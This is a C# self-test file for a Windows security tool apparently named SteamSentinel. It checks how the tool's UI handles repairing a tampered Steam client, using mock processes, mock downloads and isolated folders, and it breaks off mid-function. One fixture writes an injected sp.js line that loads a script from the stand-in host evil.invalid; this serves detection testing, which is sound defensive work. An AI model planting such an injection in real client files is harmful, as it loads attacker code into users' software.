using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using SteamSentinel.App;
using SteamSentinel.App.Dialogs;
using SteamSentinel.App.Localization;
using SteamSentinel.App.Services;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Reporting;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    /// <summary>
    /// 验证 Wave 3 无缝修复、Tier 2 按需 CDN 补包、Tier 3 官方安装器兜底入口与多分辨率零重叠/零截断 UI 契约（全部使用隔离目录与内存桩，严禁触碰宿主机 Steam 或访问公网）。
    /// </summary>
    internal static async Task TestSteamFullRecoveryUiAsync(string root)
    {
        string work = Path.Combine(root, "steam-ui-" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(work);

        try
        {
            await UiFixtureApplication.RunOnStaApplicationAsync(async _ =>
            {
                RenderOptions.ProcessRenderMode = System.Windows.Interop.RenderMode.SoftwareOnly;
                using IDisposable clearCultureScope = DisplayText.UseApplicationCulture();
                CultureInfo originalCulture = DisplayText.ApplicationCulture;
                try
                {
                    Localizer.Instance.ApplyLanguage(DisplayText.Chinese);
                    await VerifySeamlessSpJsRemediationAndLaunchSelfCheckAsync(work);
                    await VerifyPackageDownloadOnlineAndOfflineFallbackAsync(work);
                    await VerifyOfficialRepairFlowAndDualButtonLayoutsAsync(work);
                    VerifyRepairStepperStageUiContracts();
                    VerifyPlainLanguageHandlingContracts();
                }
                finally
                {
                    Localizer.Instance.ApplyLanguage(DisplayText.Chinese);
                    if (!Equals(DisplayText.ApplicationCulture, originalCulture))
                    {
                        Localizer.Instance.ApplyLanguage(originalCulture);
                    }
                }
            });
        }
        finally
        {
            try
            {
                if (Directory.Exists(work))
                {
                    Directory.Delete(work, recursive: true);
                }
            }
            catch
            {
                // 隔离测试目录清理异常不影响断言归集。
            }
        }
    }

    private static async Task VerifySeamlessSpJsRemediationAndLaunchSelfCheckAsync(string work)
    {
        string fixtureDir = Path.Combine(work, "spjs-case");
        string steamRoot = Path.Combine(fixtureDir, "TargetSteam");
        string steamUiDir = Path.Combine(steamRoot, "steamui");
        string cefDir = Path.Combine(steamRoot, "bin", "cef");
        string tempRoot = Path.Combine(fixtureDir, "installer-temp");
        Directory.CreateDirectory(steamUiDir);
        Directory.CreateDirectory(cefDir);
        Directory.CreateDirectory(tempRoot);

        string steamExe = Path.Combine(steamRoot, "steam.exe");
        await File.WriteAllBytesAsync(steamExe, CreateMockExecutableBytes("VALVE_CLEAN_STEAM"));

        string spJsPath = Path.Combine(steamUiDir, "sp.js");
        const string injectedSpJs = ";(function(){var s=document.createElement('script');s.src='https://evil.invalid/sp.js';document.head.appendChild(s);})();";
        await File.WriteAllTextAsync(spJsPath, injectedSpJs, new UTF8Encoding(false));
        string spJsHash = await Hashing.Sha256FileAsync(spJsPath);

        SteamLayout layout = CreateIsolatedLayout(steamRoot);
        MockSteamProcessEnvironment procEnv = new()
        {
            VerifyFunc = path => string.Equals(path, steamExe, StringComparison.OrdinalIgnoreCase)
                ? TrustedValveResult()
                : new SignatureResult(SignatureStatus.Unsigned, (MessageText)"unsigned")
        };
        procEnv.RunningProcesses.AddRange(
        [
            new(9201, "steam", steamExe),
            new(9202, "steamwebhelper", Path.Combine(cefDir, "steamwebhelper.exe"))
        ]);

        // 配置三种 LaunchVerifiedSteam 行为的可控桩
        int launchScenario = 0;
        bool signValid = true;
        DelegateSteamClientProcessLauncher launcher = new(
            isElevated: () => true,
            direct: _ => (false, null, "not used when elevated"),
            deElevated: _ => launchScenario switch
            {
                0 => (true, 9305, null),
                _ => (false, null, "no standard shell token")
            });

        SteamOfficialInstallerService installerSvc = new(
            processController: new SteamProcessController(procEnv),
            verifySignature: (_, _) => signValid
                ? TrustedValveResult()
                : new SignatureResult(SignatureStatus.HashMismatch, (MessageText)"tampered"),
            verifyTimestamp: (_, _) => ValidTimestampResult(),
            clientLauncher: launcher,
            temporaryRoot: tempRoot);

        Finding spJsFinding = new()
        {
            Id = "ui-spjs-1",
            RuleId = "STEAM-UI-EXTERNAL-SCRIPT",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.Critical,
            Score = 95,
            Title = "Steam UI external script injection",
            Target = spJsPath,
            Sha256 = spJsHash,
            IsKnownMalware = true,
            CanRemediate = true,
            ConfigurationKind = SteamConfigurationRepair.UiFile,
            SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
        };

        MainWindow window = CreatePreparedWindow(layout, procEnv, installerSvc, (_, _) => TrustedValveResult());
        try
        {
            using UiLayoutHarness layoutHarness = new(window, 1148, 780);
            window.ApplyScanReportForTesting(CreateScanReport(spJsFinding));
            window.Findings.Single().IsSelected = true;
            layoutHarness.Refresh();

            bool? previewSawAutoClose = null;
            bool previewHasNoticeText = false;
            bool previewLayoutValid = false;
            List<string> unexpectedAlerts = [];
            string? capturedGuidanceDetails = null;
            bool stepperObservedDuringExecute = false;
            int? percentObservedDuringExecute = null;
            bool determinateBarObserved = false;

            await window.ExecuteSelectedRemediationAsync(
                inspectTargetRunner: (_, _) => Task.FromResult(CreateCleanCustomReport()),
                confirmPreview: preview =>
                {
                    previewSawAutoClose = preview.WillAutoCloseSteam;
                    previewHasNoticeText = preview.NoticeText.Contains(
                        DisplayText.Get("SteamConfig.AutoCloseSteamNotice").Trim(),
                        StringComparison.Ordinal);
                    using UiLayoutHarness previewSmall = new(preview, 600, 420);
                    previewLayoutValid = previewSmall.IsFullyVisible((FrameworkElement)preview.FindName("ConfirmCheckBox")) &&
                                         previewSmall.IsFullyVisible((FrameworkElement)preview.FindName("ExecuteButton"));
                    return true;
                },
                executePlanRunner: plan =>
                {
                    window.Dispatcher.Invoke(() =>
                    {
                        stepperObservedDuringExecute =
                            ((FrameworkElement)window.FindName("ScanStageOverlay")).Visibility == Visibility.Visible &&
                            ((FrameworkElement)window.FindName("RepairStepperPanel")).Visibility == Visibility.Visible;
                        determinateBarObserved = !((ProgressBar)window.FindName("ActivityProgressBar")).IsIndeterminate;
                        if (int.TryParse(TrustProxyUiText(window, "ScanStagePercentNumber").Text, out int parsedPct))
                            percentObservedDuringExecute = parsedPct;
                    });
                    // 在隔离目录内模拟 UiFile 清除，绝不触碰宿主机 Broker 或真实文件。
                    if (File.Exists(spJsPath)) File.Delete(spJsPath);
                    return Task.FromResult(CreateSucceededRunResult(plan));
                },
                postRemediationRunner: _ => Task.FromResult(CreateCleanCustomReport()),
                onDetailsPresented: (_, details) => capturedGuidanceDetails = details,
                onAlertShown: (msg, title) => unexpectedAlerts.Add($"{title}: {msg}"));

            layoutHarness.Refresh();

            Button officialBtn = TrustProxyUiButton(window, "OfficialSteamRepairButton");
            Button launchBtn = TrustProxyUiButton(window, "LaunchSteamSelfCheckButton");
            FrameworkElement bar = (FrameworkElement)window.FindName("SteamRecoveryActionsBar");
            Border outcomeBanner = (Border)window.FindName("BatchOutcomeBanner");
            Button outcomeActionBtn = TrustProxyUiButton(window, "BatchOutcomeActionButton");

            Check("Wave3 UI 运行中Steam不阻塞sp.js修复且预览窗展示自动关停提示与适配布局",
                unexpectedAlerts.Count == 0 &&
                previewSawAutoClose == true &&
                previewHasNoticeText &&
                previewLayoutValid &&
                stepperObservedDuringExecute &&
                determinateBarObserved &&
                percentObservedDuringExecute is >= 10 &&
                outcomeBanner.Visibility == Visibility.Visible &&
                ((SolidColorBrush)outcomeBanner.Background).Color == Color.FromRgb(0xEC, 0xFD, 0xF5) &&
                Equals(outcomeActionBtn.Content, DisplayText.Get("Ui.SteamRepair.LaunchSelfCheckButton")) &&
                !string.IsNullOrWhiteSpace(capturedGuidanceDetails) &&
                capturedGuidanceDetails.Contains("SteamSetup.exe", StringComparison.OrdinalIgnoreCase));

            Check("Wave3 UI 移除sp.js且steam.exe验签有效时按需显示启动自检入口并隐藏官方安装器按钮",
                bar.Visibility == Visibility.Visible &&
                launchBtn.Visibility == Visibility.Visible &&
                officialBtn.Visibility == Visibility.Collapsed &&
                layoutHarness.IsFullyVisible(launchBtn));

            // 切换到 Findings 页签核查无障碍可用性提示
            TabControl tabs = (TabControl)window.FindName("ResultTabs");
            tabs.SelectedIndex = 0;
            layoutHarness.Refresh();
            Check("Wave3 UI 摘要页签在自检可用时展示对应说明文本",
                TrustProxyUiText(window, "RemediationAvailabilityTextBlock").Text ==
                DisplayText.Get("Ui.RemediationAvailability.SteamSelfCheckAvailable"));

            // 1) LaunchVerifiedSteam 返回 LaunchedDeElevated
            List<(string Title, string Message, MessageBoxImage Icon)> notices = [];
            await window.ExecuteLaunchSteamSelfCheckAsync((msg, title, icon) => notices.Add((title, msg, icon)));
            Check("Wave3 UI 自检按钮正确透传安全降权拉起状态与PID",
                notices.Count == 1 &&
                notices[0].Icon == MessageBoxImage.Information &&
                notices[0].Message.Contains("9305", StringComparison.Ordinal));

            // 2) LaunchVerifiedSteam 返回 RefusedElevatedWithoutStandardToken
            launchScenario = 1;
            notices.Clear();
            await window.ExecuteLaunchSteamSelfCheckAsync((msg, title, icon) => notices.Add((title, msg, icon)));
            Check("Wave3 UI 高权限且无普通桌面令牌时拒绝直启并给出警示",
                notices.Count == 1 &&
                notices[0].Icon == MessageBoxImage.Warning &&
                notices[0].Message.Contains(
                    DisplayText.Get("Ui.SteamRepair.LaunchResult.RefusedElevated").Split('{')[0].Trim(),
                    StringComparison.Ordinal));

            // 3) LaunchVerifiedSteam 返回 RefusedUntrustedSignature -> 立即切换显示 OfficialSteamRepairButton
            signValid = false;
            notices.Clear();
            await window.ExecuteLaunchSteamSelfCheckAsync((msg, title, icon) => notices.Add((title, msg, icon)));
            layoutHarness.Refresh();
            Check("Wave3 UI 本地steam.exe验签失败时拒绝拉起并自动切换至官方覆盖修复按钮",
                notices.Count == 1 &&
                notices[0].Icon == MessageBoxImage.Warning &&
                launchBtn.Visibility == Visibility.Collapsed &&
                officialBtn.Visibility == Visibility.Visible);
        }
        finally
        {
            CloseSummaryFixture(window);
        }
    }

    private static async Task VerifyPackageDownloadOnlineAndOfflineFallbackAsync(string work)
    {
        string fixtureDir = Path.Combine(work, "pkg-download-case");
        string steamRoot = Path.Combine(fixtureDir, "TargetSteam");
        string pkgDir = Path.Combine(steamRoot, "package");
        string steamUiDir = Path.Combine(steamRoot, "steamui");
        Directory.CreateDirectory(pkgDir);
        Directory.CreateDirectory(steamUiDir);

        byte[] cleanSteamExe = CreateMockExecutableBytes("VALVE_OFFICIAL_STEAM_V1");
        byte[] tamperedSteamExe = CreateMockExecutableBytes("TAMPERED_STEAM_EXE");
        string steamExe = Path.Combine(steamRoot, "steam.exe");
        await File.WriteAllBytesAsync(steamExe, tamperedSteamExe);
        string tamperedExeHash = await Hashing.Sha256FileAsync(steamExe);

        string spJsPath = Path.Combine(steamUiDir, "sp.js");
        await File.WriteAllTextAsync(spJsPath, ";window.evil='x';", new UTF8Encoding(false));
        string spJsHash = await Hashing.Sha256FileAsync(spJsPath);

        const string steamRowZipName = "steam_win64_steamrow.zip.1234567890abcdef1234567890abcdef12345678";
        byte[] steamExeZip = CreateZipBytes(("steam.exe", cleanSteamExe));
        string steamExeZipSha = Hashing.Sha256Bytes(steamExeZip);
        string manifestText =
            $$"""
            "win64"
            {
                "version"        "1794536281"
                "ostype"        "win10"
                "steam_win64"
                {
                    "steamrow"
                    {
                        "file"        "{{steamRowZipName}}"
                        "size"        "{{steamExeZip.Length}}"
                        "sha2"        "{{steamExeZipSha}}"
                        "IsBootstrapperPackage"        "1"
                    }
                }
            }
            """;
        await File.WriteAllTextAsync(Path.Combine(pkgDir, "steam_client_win64.manifest"), manifestText, new UTF8Encoding(false));

        string installedBodyLf = $"steam.exe,{cleanSteamExe.Length};1794535550;{SteamPackageArchive.ComputeCrc32(cleanSteamExe)}\nOSVER=20\nVERSION=3\n";
        string installedSha1 = Convert.ToHexString(SHA1.HashData(Encoding.UTF8.GetBytes(installedBodyLf)));
        await File.WriteAllTextAsync(
            Path.Combine(pkgDir, "steam_client_win64.installed"),
            (installedBodyLf + $"SHA1={installedSha1}\n").Replace("\n", "\r\n", StringComparison.Ordinal),
            new UTF8Encoding(false));

        SteamLayout layout = CreateIsolatedLayout(steamRoot);
        MockSteamProcessEnvironment procEnv = new();
        procEnv.RunningProcesses.Add(new(9401, "steam", steamExe));

        Finding exeFinding = new()
        {
            Id = "pkg-exe-1",
            RuleId = "STEAM-CLIENT-BINARY-TAMPERED",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.Critical,
            Score = 98,
            Title = "Steam binary tampered",
            Target = steamExe,
            Sha256 = tamperedExeHash,
            IsKnownMalware = false,
            CanRemediate = true,
            ConfigurationKind = SteamConfigurationRepair.PackageRestore,
            SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
        };
        Finding spJsFinding = new()
        {
            Id = "pkg-spjs-2",
            RuleId = "STEAM-UI-EXTERNAL-SCRIPT",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.Critical,
            Score = 95,
            Title = "Steam UI injected script",
            Target = spJsPath,
            Sha256 = spJsHash,
            IsKnownMalware = true,
            CanRemediate = true,
            ConfigurationKind = SteamConfigurationRepair.UiFile,
            SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
        };

        // 子场景 A：离线/CDN 不可达 -> 不崩溃、保留 sp.js UiFile 计划、记录 PackageUnavailable 并弹出官方安装器修复按钮
        using MockHttpHandler offlineHttp = new(_ => new HttpResponseMessage(HttpStatusCode.ServiceUnavailable));
        MainWindow offlineWindow = CreatePreparedWindow(
            layout, procEnv, new SteamOfficialInstallerService(new SteamProcessController(procEnv)),
            (_, _) => TrustedValveResult(), allowPackageDownload: true, packageHttpHandler: offlineHttp);
        try
        {
            using UiLayoutHarness layoutHarness = new(offlineWindow, 1148, 780);
            offlineWindow.ApplyScanReportForTesting(CreateScanReport(exeFinding, spJsFinding));
            foreach (var item in offlineWindow.Findings) item.IsSelected = true;

            bool previewedSpJsOnly = false;
            bool previewLargeLayoutOk = false;
            List<string> alerts = [];
            await offlineWindow.ExecuteSelectedRemediationAsync(
                inspectTargetRunner: (_, _) => Task.FromResult(CreateCleanCustomReport()),
                confirmPreview: preview =>
                {
                    using UiLayoutHarness previewLarge = new(preview, 860, 620);
                    previewLargeLayoutOk = previewLarge.IsFullyVisible((FrameworkElement)preview.FindName("ConfirmCheckBox")) &&
                                           previewLarge.IsFullyVisible((FrameworkElement)preview.FindName("ExecuteButton"));
                    previewedSpJsOnly = preview.Actions.Any(a => a.Target.Equals(spJsPath, StringComparison.OrdinalIgnoreCase)) &&
                                        !preview.Actions.Any(a => a.Target.Equals(steamExe, StringComparison.OrdinalIgnoreCase)) &&
                                        preview.WillAutoCloseSteam;
                    return false;
                },
                executePlanRunner: _ => throw new InvalidOperationException("preview-only"),
                onAlertShown: (msg, title) => alerts.Add($"{title}: {msg}"));
            layoutHarness.Refresh();

            Check("Wave3 UI 断网补拉失败时不崩溃并保留UiFile隔离与官方修复兜底入口",
                alerts.Count == 0 &&
                previewedSpJsOnly &&
                previewLargeLayoutOk &&
                TrustProxyUiButton(offlineWindow, "OfficialSteamRepairButton").Visibility == Visibility.Visible);
        }
        finally
        {
            CloseSummaryFixture(offlineWindow);
        }

        // 子场景 B：联网可达 mock CDN -> allowPackageDownload=true 触发单分包补拉并产出 PackageRestore 计划
        int cdnRequests = 0;
        using MockHttpHandler onlineHttp = new(req =>
        {
            cdnRequests++;
            return req.RequestUri!.AbsolutePath.EndsWith(steamRowZipName, StringComparison.OrdinalIgnoreCase)
                ? BinaryResponse(steamExeZip)
                : new HttpResponseMessage(HttpStatusCode.NotFound);
        });
        MainWindow onlineWindow = CreatePreparedWindow(
            layout, procEnv, new SteamOfficialInstallerService(new SteamProcessController(procEnv)),
            (_, _) => TrustedValveResult(), allowPackageDownload: true, packageHttpHandler: onlineHttp);
        try
        {
            using UiLayoutHarness layoutHarness = new(onlineWindow, 1148, 780);
            onlineWindow.ApplyScanReportForTesting(CreateScanReport(exeFinding));
            onlineWindow.Findings.Single().IsSelected = true;

            bool plannedPackageRestore = false;
            bool previewWillAutoClose = false;
            List<string> onlineAlerts = [];
            await onlineWindow.ExecuteSelectedRemediationAsync(
                inspectTargetRunner: (_, _) => Task.FromResult(CreateCleanCustomReport()),
                confirmPreview: preview =>
                {
                    plannedPackageRestore = preview.Plan.Actions.Any(a =>
                        a.Type == RemediationActionType.RepairSteamConfiguration &&
                        a.ConfigurationKind == SteamConfigurationRepair.PackageRestore &&
                        a.Target.Equals(steamExe, StringComparison.OrdinalIgnoreCase));
                    previewWillAutoClose = preview.WillAutoCloseSteam;
                    return false;
                },
                executePlanRunner: _ => throw new InvalidOperationException("preview-only"),
                onAlertShown: (msg, title) => onlineAlerts.Add($"{title}: {msg}"));

            Check("Wave3 UI 联网可达时准备期按需下载单个官方分包并生成原位还原预览",
                onlineAlerts.Count == 0 && cdnRequests > 0 && plannedPackageRestore && previewWillAutoClose);
        }
        finally
        {
            CloseSummaryFixture(onlineWindow);
        }
    }

    private static async Task VerifyOfficialRepairFlowAndDualButtonLayoutsAsync(string work)
    {
        string fixtureDir = Path.Combine(work, "official-and-layout");
        string steamRoot = Path.Combine(fixtureDir, "TargetSteam");
        string steamUiDir = Path.Combine(steamRoot, "steamui");
        string tempRoot = Path.Combine(fixtureDir, "installer-temp");
        Directory.CreateDirectory(steamUiDir);
        Directory.CreateDirectory(tempRoot);

        string steamExe = Path.Combine(steamRoot, "steam.exe");
        await File.WriteAllBytesAsync(steamExe, CreateMockExecutableBytes("VALVE_STEAM_CLIENT"));
        string spJsPath = Path.Combine(steamUiDir, "sp.js");
        await File.WriteAllTextAsync(spJsPath, ";window.badUi=1;", new UTF8Encoding(false));
        string spJsHash = await Hashing.Sha256FileAsync(spJsPath);

        byte[] mockSetupBytes = CreateMockExecutableBytes("MOCK_STEAM_SETUP_EXE", length: 200 * 1024);
        using MockHttpHandler setupHttp = new(_ => BinaryResponse(mockSetupBytes));

        bool installerExecuted = false;
        bool busyObservedDuringRepair = false;
        bool activityVisibleDuringRepair = false;
        bool stepperVisibleDuringInstaller = false;
        int percentDuringInstaller = 0;
        string? stageTitleDuringInstaller = null;
        MainWindow? observedWindow = null;

        MockSteamProcessEnvironment procEnv = new();
        SteamLayout layout = CreateIsolatedLayout(steamRoot);
        SteamOfficialInstallerService installerSvc = new(
            processController: new SteamProcessController(procEnv),
            httpMessageHandler: setupHttp,
            verifySignature: (_, _) => TrustedValveResult(),
            verifyTimestamp: (_, _) => ValidTimestampResult(),
            runInstaller: (req, _) =>
            {
                installerExecuted = true;
                if (observedWindow is not null)
                {
                    observedWindow.Dispatcher.Invoke(new Action(() =>
                    {
                        busyObservedDuringRepair = TrustProxyUiButton(observedWindow, "CancelScanButton").IsEnabled &&
                                                   !TrustProxyUiButton(observedWindow, "OfficialSteamRepairButton").IsEnabled;
                        activityVisibleDuringRepair = ((FrameworkElement)observedWindow.FindName("ActivityPanel")).Visibility == Visibility.Visible;
                        stepperVisibleDuringInstaller = ((FrameworkElement)observedWindow.FindName("RepairStepperPanel")).Visibility == Visibility.Visible;
                        if (int.TryParse(TrustProxyUiText(observedWindow, "ScanStagePercentNumber").Text, out int parsedPct))
                            percentDuringInstaller = parsedPct;
                        stageTitleDuringInstaller = TrustProxyUiText(observedWindow, "ScanStageTitleText").Text;
                    }));
                }
                return Task.FromResult(new SteamInstallerExecutionResult(0, "ok"));
            },
            temporaryRoot: tempRoot);

        // 先直接校验 DownloadAndVerifyInstallerAsync 的向后兼容进度回调与分块节流行为
        List<(long BytesRead, long? TotalBytes)> directProgressReports = [];
        SteamOfficialInstallerService probeSvc = new(
            processController: new SteamProcessController(procEnv),
            httpMessageHandler: setupHttp,
            verifySignature: (_, _) => TrustedValveResult(),
            verifyTimestamp: (_, _) => ValidTimestampResult(),
            temporaryRoot: tempRoot);
        {
            using DownloadedSteamInstaller pkg = await probeSvc.DownloadAndVerifyInstallerAsync(
                CancellationToken.None,
                new ImmediateProgressReport<(long BytesRead, long? TotalBytes)>(directProgressReports.Add));
            Check("Wave3 Installer 下载字节进度上报单调递增并到达完整总字节数",
                pkg.FileSizeBytes == mockSetupBytes.Length &&
                directProgressReports.Count >= 2 &&
                directProgressReports[^1].BytesRead == mockSetupBytes.Length &&
                directProgressReports[^1].TotalBytes == mockSetupBytes.Length);
        }

        MainWindow window = CreatePreparedWindow(layout, procEnv, installerSvc, (_, _) => TrustedValveResult());
        observedWindow = window;
        try
        {
            // 1) Tier 3 STEAM-CLIENT-BINARY-MISSING 触发官方修复入口 + 点击后走完整确认/Busy/自动复扫收口
            Finding missingExe = new()
            {
                Id = "missing-steam-1",
                RuleId = "STEAM-CLIENT-BINARY-MISSING",
                Category = FindingCategory.Steam,
                Severity = FindingSeverity.High,
                Score = 90,
                Title = "steam.exe missing",
                Target = steamExe,
                CanRemediate = false,
                SuggestedActions = [SuggestedActionKind.ReviewOnly]
            };

            using UiLayoutHarness harness = new(window, 1148, 780);
            window.ApplyScanReportForTesting(CreateScanReport(missingExe));
            harness.Refresh();

            Button officialBtn = TrustProxyUiButton(window, "OfficialSteamRepairButton");
            Button launchBtn = TrustProxyUiButton(window, "LaunchSteamSelfCheckButton");
            Check("Wave3 UI 主程序缺失时自动显示官方安装器修复按钮",
                officialBtn.Visibility == Visibility.Visible &&
                launchBtn.Visibility == Visibility.Collapsed &&
                TrustProxyUiText(window, "RemediationAvailabilityTextBlock").Text ==
                DisplayText.Get("Ui.RemediationAvailability.SteamOfficialRepairAvailable"));

            string? confirmBodyCaptured = null;
            bool rescanCalled = false;
            await window.ExecuteOfficialSteamRepairAsync(
                confirmPrompt: (body, _) =>
                {
                    confirmBodyCaptured = body;
                    return true;
                },
                rescanRunner: (_, _, _) =>
                {
                    rescanCalled = true;
                    window.ApplyScanReportForTesting(CreateCleanCustomReport());
                    return Task.CompletedTask;
                });
            harness.Refresh();

            Check("Wave3 UI 官方安装器修复弹窗说明HTTPS与游戏库保留，并经Busy横幅复扫刷新状态",
                confirmBodyCaptured is not null &&
                confirmBodyCaptured.Contains("SteamSetup.exe", StringComparison.Ordinal) &&
                confirmBodyCaptured.Contains("HTTPS", StringComparison.OrdinalIgnoreCase) &&
                installerExecuted &&
                busyObservedDuringRepair &&
                activityVisibleDuringRepair &&
                stepperVisibleDuringInstaller &&
                percentDuringInstaller >= 70 &&
                Equals(stageTitleDuringInstaller, DisplayText.Get("Ui.RepairStage.Official.Step2RunTitle")) &&
                rescanCalled &&
                ((FrameworkElement)window.FindName("ActivityPanel")).Visibility == Visibility.Collapsed &&
                ((FrameworkElement)window.FindName("RepairStepperPanel")).Visibility == Visibility.Collapsed &&
                officialBtn.Visibility == Visibility.Collapsed &&
                ((FrameworkElement)window.FindName("SteamRecoveryActionsBar")).Visibility == Visibility.Collapsed);
        }
        finally
        {
            CloseSummaryFixture(window);
        }

        // 2) 通过真实业务流形成双按钮同显场景：已移除 sp.js + 本地正版 steam.exe + 复扫仍残留 CSS 异常
        Finding spJsFinding = new()
        {
            Id = "dual-spjs",
            RuleId = "STEAM-UI-EXTERNAL-SCRIPT",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.Critical,
            Score = 95,
            Title = "Steam UI external script",
            Target = spJsPath,
            Sha256 = spJsHash,
            IsKnownMalware = true,
            CanRemediate = true,
            ConfigurationKind = SteamConfigurationRepair.UiFile,
            SuggestedActions = [SuggestedActionKind.RepairSteamConfiguration]
        };
        Finding lingeringCss = new()
        {
            Id = "dual-css",
            RuleId = "STEAM-UI-CSS-SUPPRESSION",
            Category = FindingCategory.Steam,
            Severity = FindingSeverity.Medium,
            Score = 65,
            Title = "Steam CSS suppression",
            Target = Path.Combine(steamUiDir, "libraryroot.css"),
            CanRemediate = false,
            SuggestedActions = [SuggestedActionKind.ReviewOnly]
        };

        foreach ((int width, int height) in new[] { (1148, 780), (784, 460) })
        {
            Localizer.Instance.ApplyLanguage(DisplayText.Chinese);
            MainWindow layoutWindow = CreatePreparedWindow(layout, procEnv, installerSvc, (_, _) => TrustedValveResult());
            try
            {
                using UiLayoutHarness viewport = new(layoutWindow, width, height);
                layoutWindow.ApplyScanReportForTesting(CreateScanReport(spJsFinding));
                layoutWindow.Findings.Single().IsSelected = true;
                await layoutWindow.ExecuteSelectedRemediationAsync(
                    inspectTargetRunner: (_, _) => Task.FromResult(CreateCleanCustomReport()),
                    confirmPreview: _ => true,
                    executePlanRunner: plan => Task.FromResult(CreateSucceededRunResult(plan)),
                    postRemediationRunner: _ => Task.FromResult(CreateScanReport(lingeringCss)),
                    onDetailsPresented: (_, _) => { },
                    onAlertShown: (msg, title) => Check($"Wave3 UI 双按钮前置清理意外弹窗: {title}: {msg}", false));

                TabControl tabs = (TabControl)layoutWindow.FindName("ResultTabs");
                WrapPanel bar = (WrapPanel)layoutWindow.FindName("SteamRecoveryActionsBar");
                Border availabilityPanel = (Border)layoutWindow.FindName("RemediationAvailabilityPanel");
                Button officialBtn = TrustProxyUiButton(layoutWindow, "OfficialSteamRepairButton");
                Button launchBtn = TrustProxyUiButton(layoutWindow, "LaunchSteamSelfCheckButton");
                Button exportBtn = TrustProxyUiButton(layoutWindow, "ExportButton");
                Button remediateBtn = TrustProxyUiButton(layoutWindow, "RemediateButton");
                Button followUpDetailsBtn = TrustProxyUiButton(layoutWindow, "FollowUpDetailsButton");
                DataGrid findingsGrid = (DataGrid)layoutWindow.FindName("FindingsGrid");

                if (width == 1148)
                {
                    tabs.SelectedIndex = 1;
                    viewport.Refresh();
                    Check("Wave3 UI Coverage页签下按需恢复栏自动折叠不占空间",
                        bar.Visibility == Visibility.Collapsed);
                }

                // 验证 中英文真热切换 + 当前视口 + Findings(0) / BatchResults(2) 全布局无重叠无截断
                foreach (CultureInfo culture in new[] { DisplayText.Chinese, DisplayText.English })
                {
                    Localizer.Instance.ApplyLanguage(culture);

                    foreach (int tabIndex in new[] { 0, 2 })
                    {
                        tabs.SelectedIndex = tabIndex;
                        viewport.Refresh();
                        double pixelsPerDip = VisualTreeHelper.GetDpi(layoutWindow).PixelsPerDip;
                        string tag = $"{DisplayText.Culture.Name}/{width}x{height}/tab{tabIndex}";

                        bool commonButtonsOk =
                            bar.Visibility == Visibility.Visible &&
                            officialBtn.Visibility == Visibility.Visible &&
                            launchBtn.Visibility == Visibility.Visible &&
                            viewport.IsFullyVisible(bar) &&
                            viewport.IsFullyVisible(officialBtn) &&
                            viewport.IsFullyVisible(launchBtn) &&
                            !viewport.HasScrollingAncestor(officialBtn) &&
                            !viewport.HasScrollingAncestor(launchBtn) &&
                            viewport.DoNotOverlap([officialBtn, launchBtn]) &&
                            viewport.DoNotOverlap([bar, exportBtn]) &&
                            IsButtonTextFullyVisible(officialBtn, pixelsPerDip) &&
                            IsButtonTextFullyVisible(launchBtn, pixelsPerDip) &&
                            Equals(officialBtn.Content, DisplayText.Get("Ui.SteamRepair.OfficialButton")) &&
                            Equals(launchBtn.Content, DisplayText.Get("Ui.SteamRepair.LaunchSelfCheckButton"));

                        bool tabSpecificOk = tabIndex == 0
                            ? viewport.DoNotOverlap([bar, remediateBtn]) &&
                              viewport.DoNotOverlap([bar, availabilityPanel]) &&
                              findingsGrid.ActualHeight >= 70 &&
                              (findingsGrid.Items.Count == 0 ||
                               (findingsGrid.ItemContainerGenerator.ContainerFromIndex(0) is FrameworkElement firstRow &&
                                viewport.IsFullyVisible(firstRow))) &&
                              UiLayoutFixtures.ResultButtons.All(name =>
                                  viewport.IsFullyVisible((FrameworkElement)layoutWindow.FindName(name)))
                            : viewport.DoNotOverlap([bar, followUpDetailsBtn]) &&
                              viewport.IsFullyVisible(followUpDetailsBtn) &&
                              viewport.IsFullyVisible(exportBtn);

                        Check($"Wave3 UI 双恢复按钮同显布局无遮挡且文字零截断 ({tag})", commonButtonsOk && tabSpecificOk);
                    }
                }
            }
            finally
            {
                CloseSummaryFixture(layoutWindow);
            }
        }
    }

    private static MainWindow CreatePreparedWindow(
        SteamLayout layout,
        MockSteamProcessEnvironment procEnv,
        SteamOfficialInstallerService installerSvc,
        Func<string, Microsoft.Win32.SafeHandles.SafeFileHandle?, SignatureResult>? verifyExe,
        bool allowPackageDownload = true,
        HttpMessageHandler? packageHttpHandler = null)
    {
        MainWindow window = new();
        UiPreview.ApplyAccessState(window, InstallationSecurityStatus.Protected, new(false, true));
        window.SetSteamLayoutForTesting(layout);
        window.ConfigureSteamRecoveryServicesForTesting(
            processController: new SteamProcessController(procEnv),
            installerService: installerSvc,
            allowPackageDownload: allowPackageDownload,
            packageHttpMessageHandler: packageHttpHandler,
            verifySteamExecutableSignature: verifyExe);
        return window;
    }

    private static SteamLayout CreateIsolatedLayout(string steamRoot)
    {
        SteamLayout layout = new();
        layout.SteamRoots.Add(steamRoot);
        return layout;
    }

    private static ScanReport CreateScanReport(params Finding[] findings) => new()
    {
        Mode = ScanMode.Custom,
        Coverage = ScanCoverage.Complete,
        CompletedAtUtc = DateTimeOffset.UtcNow,
        StatusSchemaVersion = ScanExecution.SchemaVersion,
        ExecutionState = ScanExecutionState.Completed,
        Findings = [.. findings]
    };

    private static ScanReport CreateCleanCustomReport() => CreateScanReport();

    private static RemediationRunResult CreateSucceededRunResult(RemediationPlan plan)
    {
        RemediationRunResult result = new()
        {
            PlanId = plan.PlanId,
            Success = true,
            Disposition = RemediationRunDisposition.Completed,
            VerificationStatus = RemediationVerificationStatus.Verified
        };
        foreach (RemediationAction action in plan.Actions)
        {
            result.Actions.Add(new RemediationActionResult
            {
